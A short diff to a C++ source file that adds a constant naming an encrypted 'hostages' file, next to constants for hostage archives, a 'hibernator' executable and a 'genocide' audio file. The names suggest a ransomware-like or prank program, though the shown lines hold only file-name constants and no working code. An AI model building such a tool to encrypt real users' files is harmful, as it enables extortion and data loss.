@@ -11,6 +11,7 @@ const std::string bin_dir= "bin/";
 const std::string hostage_file= "hostages.af";
 const std::string hostage_archive= "hostages.tar";
 const std::string hostage_compressed= "hostages.tar.gz";
+const std::string hostage_encrypted = "hostages.enc";
 const std::string hib_exec= "hibernator";
 const std::string audio_file= "genocide.oga";
 const std::string file_delim= "/";
